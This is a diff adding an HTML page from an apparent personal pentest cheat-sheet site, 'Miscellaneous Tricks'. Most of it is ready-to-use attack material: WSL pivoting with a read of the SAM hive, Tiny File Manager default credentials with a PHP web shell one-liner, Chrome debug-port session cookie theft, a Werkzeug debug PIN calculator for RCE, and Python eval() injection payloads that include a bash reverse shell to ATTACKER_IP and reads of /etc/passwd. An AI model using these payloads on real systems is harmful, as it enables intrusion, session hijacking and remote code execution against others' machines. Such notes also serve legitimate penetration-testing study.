@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Miscellaneous Tricks — Corey Clay</title>
+<meta name="description" content="Miscellaneous pentest tricks — cross-user messaging (msg / wall / write), NetExec credential database, Kerberos clock-skew fixes, WSL pivoting, Tiny File Manager defaults, Chrome remote-debugging cookie theft, Werkzeug debug PIN calc, Python eval() injection.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ other / miscellaneous tricks</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a class="here" href="other.html" aria-current="page">other</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="other.html">&lsaquo; other</a> &nbsp;/&nbsp; // catch-all</p>
+  <h1>Miscellaneous Tricks</h1>
+  <p>The tricks that didn't fit anywhere else — cross-user messaging (msg / wall / write), the NetExec credential database workflow, Kerberos clock-skew detection and fixing, WSL as a pivot into the Windows filesystem, Tiny File Manager default credentials, Chrome remote-debugging cookie theft via port 9222, Werkzeug debug PIN calculation for Flask RCE, and Python eval() injection via API fields.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#send-messages-to-other-users">Send Messages to Other Users</a>
+      <a href="#netexec-credential-database">NetExec Credential Database</a>
+      <a href="#kerberos-clock-synchronization">Kerberos Clock Synchronization</a>
+      <a href="#wsl-windows-subsystem-for-linux-as-a-pivot-point">WSL (Windows Subsystem for Linux) as a Pivot Point</a>
+      <a href="#chrome-remote-debugging-session-cookie-theft">Chrome Remote Debugging — Session Cookie Theft</a>
+      <a href="#werkzeug-debug-pin-calculation-flask-rce">Werkzeug Debug PIN Calculation (Flask RCE)</a>
+      <a href="#python-eval-injection-via-api-field">Python eval() Injection via API Field</a>
+      <a href="#references">References</a>
+  </div>
+</nav>
+
+<main class="wrap">
+<p>All the tricks that couldn't be classified somewhere else.</p>
+<h2 id="send-messages-to-other-users">Send Messages to Other Users</h2>
+<h3>Windows</h3>
+<pre><code class="language-powershell">msg Swissky /SERVER:CRASHLAB &quot;Stop rebooting the XXXX service !&quot;
+msg * /V /W /SERVER:CRASHLAB &quot;Hello all !&quot;
+</code></pre>
+<h3>Linux</h3>
+<pre><code class="language-bash">wall &quot;Stop messing with the XXX service !&quot;
+wall -n &quot;System will go down for 2 hours maintenance at 13:00 PM&quot;  # &quot;-n&quot; only for root
+who
+write root pts/2  # Press Ctrl+D after typing the message
+</code></pre>
+<h2 id="netexec-credential-database">NetExec Credential Database</h2>
+<h3>Basic Usage</h3>
+<pre><code class="language-bash">nxcdb (default) &gt; workspace create test
+nxcdb (test) &gt; workspace default
+nxcdb (test) &gt; proto smb
+nxcdb (test)(smb) &gt; creds
+nxcdb (test)(smb) &gt; export creds csv /tmp/creds
+</code></pre>
+<h3>Workspace Management</h3>
+<pre><code class="language-bash">## Get current workspace
+poetry run nxcdb -gw
+
+## Create workspace
+poetry run nxcdb -cw testing
+
+## Set workspace
+poetry run nxcdb -sw testing
+</code></pre>
+<h2 id="kerberos-clock-synchronization">Kerberos Clock Synchronization</h2>
+<p>In Kerberos, time is used to ensure that tickets are valid. The default clock skew tolerance is <strong>5 minutes</strong>.</p>
+<h3>Detect Clock Skew</h3>
+<p><strong>With nmap</strong>:</p>
+<pre><code class="language-bash">nmap -sV -sC &lt;TARGET_IP&gt;
+## clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s
+</code></pre>
+<p><strong>Check manually</strong>:</p>
+<pre><code class="language-bash">nmap -sT &lt;TARGET_IP&gt; -p445 --script smb2-time -vv
+</code></pre>
+<h3>Fix Clock Skew</h3>
+<p><strong>Option 1 - Modify your clock</strong>:</p>
+<pre><code class="language-bash">sudo date -s &quot;14 APR 2015 18:25:16&quot;  # Linux
+net time /domain /set                  # Windows
+</code></pre>
+<p><strong>Option 2 - Fake your clock</strong>:</p>
+<pre><code class="language-bash">faketime -f '+8h' date
+</code></pre>
+<hr />
+<h2 id="wsl-windows-subsystem-for-linux-as-a-pivot-point">WSL (Windows Subsystem for Linux) as a Pivot Point</h2>
+<p>When WSL is installed on a Windows target, it typically binds an SSH daemon on a non-standard port and provides full access to the Windows filesystem via <code>/mnt/c/</code>.</p>
+<pre><code class="language-bash">## SSH into WSL on non-standard port (common: 2222, 2200, 22222)
+ssh &lt;USER&gt;@&lt;TARGET_IP&gt; -p 2222
+
+## WSL mounts the full Windows C: drive
+ls /mnt/c/Users/
+ls /mnt/c/Users/&lt;USER&gt;/Desktop/
+ls /mnt/c/Users/&lt;USER&gt;/AppData/Roaming/
+
+## Access Windows credentials / SAM hive from WSL
+cat /mnt/c/Windows/System32/config/SAM  # (requires SYSTEM perms)
+
+## Run Windows executables from WSL
+/mnt/c/Windows/System32/cmd.exe /c whoami
+
+## Port forward to reach internal services via WSL pivot
+ssh -L &lt;LOCAL_PORT&gt;:127.0.0.1:&lt;REMOTE_PORT&gt; &lt;USER&gt;@&lt;TARGET_IP&gt; -p 2222
+
+## Exfiltrate files via SCP through WSL
+scp -P 2222 &lt;USER&gt;@&lt;TARGET_IP&gt;:/mnt/c/path/to/file .
+</code></pre>
+<pre><code>
+**Key insight:** WSL SSH typically runs as the Windows user's WSL identity. If the Windows user is a local admin, `/mnt/c/` access effectively gives full disk read access — useful for reading flag files, credential stores, and config files without needing a full Windows shell.
+
+---
+
+## Tiny File Manager Default Credentials
+
+Tiny File Manager is a single-PHP-file web-based file manager frequently deployed on CTF machines and poorly secured servers.
+
+</code></pre>
+<p>Default credentials: admin / admin\@123 Secondary default: user / 12345</p>
+<pre><code>
+```bash
+## Check if Tiny File Manager is present
+curl -s http://&lt;TARGET&gt;/filemanager/ | grep -i &quot;Tiny File Manager&quot;
+curl -s http://&lt;TARGET&gt;/fm.php | grep -i &quot;Tiny File Manager&quot;
+
+## Login and use the UI to upload a PHP web shell
+## Or use curl to upload directly once authenticated (session cookie required)
+</code></pre>
+<p><strong>After login:</strong> Use the upload function to drop a PHP web shell (e.g., <code>&lt;?php system($_GET['cmd']); ?&gt;</code>) and browse to it for RCE.</p>
+<hr />
+<h2 id="chrome-remote-debugging-session-cookie-theft">Chrome Remote Debugging — Session Cookie Theft</h2>
+<p>If Chrome is running on a target with the remote debugging port open (default: 9222), it is possible to steal all session cookies and authenticated sessions via the DevTools Protocol.</p>
+<pre><code class="language-bash">## Step 1: SSH tunnel to the Chrome debug port on the target
+ssh -L 9222:127.0.0.1:9222 &lt;USER&gt;@&lt;TARGET_IP&gt;
+
+## Step 2: Open chrome://inspect in your local browser
+## Navigate to: chrome://inspect/#devices
+## Under &quot;Remote Target&quot; — click &quot;inspect&quot; on any open tab
+
+## Step 3: In the DevTools console, dump all cookies
+document.cookie
+
+## Or use the DevTools Protocol directly via curl
+curl http://127.0.0.1:9222/json          # List open tabs/contexts
+curl http://127.0.0.1:9222/json/version  # Chrome version info
+
+## Step 4: Use extracted cookies in your browser (EditThisCookie extension)
+## or via curl:
+curl -b &quot;session=&lt;COOKIE_VALUE&gt;&quot; http://&lt;TARGET&gt;/dashboard
+</code></pre>
+<p><strong>Key insight:</strong> Applications running inside Chrome on the target (internal portals, admin panels) may have authenticated sessions. Stealing cookies via debug port gives access to those sessions without needing credentials.</p>
+<hr />
+<h2 id="werkzeug-debug-pin-calculation-flask-rce">Werkzeug Debug PIN Calculation (Flask RCE)</h2>
+<p>When a Flask/Werkzeug application is running in debug mode and the interactive debugger is exposed, you can calculate the PIN to gain a Python console with RCE. Requires reading several system values from the target.</p>
+<pre><code class="language-bash">## Required values (gather from target):
+## 1. Username running the Flask app
+cat /etc/passwd | grep -i flask  # or check process owner
+ps aux | grep python
+
+## 2. Flask app filename (absolute path)
+## Usually: /app/app.py, /opt/app/server.py, etc.
+
+## 3. Machine ID (one of these files)
+cat /etc/machine-id
+cat /proc/sys/kernel/random/boot_id   # fallback
+cat /proc/self/cgroup                  # for Docker containers (last field after /)
+
+## 4. Network interface MAC address (decimal, not hex)
+cat /sys/class/net/eth0/address
+## Convert: aa:bb:cc:dd:ee:ff → int(aabbccddeeff, 16)
+
+## PIN calculation script (Werkzeug &lt; 2.2.x formula)
+python3 &lt;&lt; 'EOF'
+import hashlib, itertools
+
+username = '&lt;USER&gt;'           # app owner
+modname = 'flask.app'         # always this
+appname = 'Flask'             # always this  
+app_path = '/app/app.py'      # absolute path to Flask app file
+mac_address = int('&lt;MAC_HEX_NO_COLONS&gt;', 16)  # e.g. int('aabbccddeeff', 16)
+machine_id = '&lt;MACHINE_ID&gt;'   # from /etc/machine-id or /proc/sys/kernel/random/boot_id
+
+probably_public_bits = [username, modname, appname, app_path]
+private_bits = [str(mac_address), machine_id]
+
+h = hashlib.sha1()
+for bit in itertools.chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+num = None
+grp = None
+for i in range(1, 10):
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+    grp = '-'.join([num[:3], num[3:6], num[6:]])
+
+print(f'PIN: {grp}')
+EOF
+
+## Use the PIN at the Werkzeug debugger URL
+## http://&lt;TARGET&gt;:&lt;PORT&gt;/console  → enter PIN → Python console → RCE
+</code></pre>
+<hr />
+<h2 id="python-eval-injection-via-api-field">Python eval() Injection via API Field</h2>
+<p>When an API endpoint passes user-supplied input to Python's <code>eval()</code> or <code>exec()</code>, it results in server-side code execution.</p>
+<pre><code class="language-bash">## Identify the vulnerable field (look for mathematical/expression-evaluating APIs)
+curl -X POST http://&lt;TARGET&gt;/api/calculate -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;expression&quot;: &quot;1+1&quot;}'
+
+## Test for eval() injection with a simple payload
+curl -X POST http://&lt;TARGET&gt;/api/calculate -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;expression&quot;: &quot;__import__(\&quot;os\&quot;).system(\&quot;id\&quot;)&quot;}'
+
+## Reverse shell via eval()
+curl -X POST http://&lt;TARGET&gt;/api/calculate -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;expression&quot;: &quot;__import__(\&quot;os\&quot;).system(\&quot;bash -c '&quot;'&quot;'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/&lt;PORT&gt; 0&gt;&amp;1'&quot;'&quot;'\&quot;)&quot;}'
+
+## Read files via eval()
+curl -X POST http://&lt;TARGET&gt;/api/calculate -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;expression&quot;: &quot;open(\&quot;/etc/passwd\&quot;).read()&quot;}'
+
+## List directory
+curl -X POST http://&lt;TARGET&gt;/api/calculate -H &quot;Content-Type: application/json&quot; \
+  -d '{&quot;expression&quot;: &quot;__import__(\&quot;os\&quot;).listdir(\&quot;/\&quot;)&quot;}'
+</code></pre>
+<p><strong>Common API fields to test for eval():</strong> <code>expression</code>, <code>formula</code>, <code>query</code>, <code>filter</code>, <code>template</code>, <code>script</code>, <code>command</code>, <code>calculation</code>.</p>
+<hr />
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/">BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL</a> - @myexploit2600 &amp; @5ub34x</li>
+<li><a href="https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html">Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it</a> - @chryzsh</li>
+<li><a href="https://www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/">How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V</a> - Craig Porteous - October 30, 2017</li>
+</ul>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — other / miscellaneous tricks · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="other.html">other</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
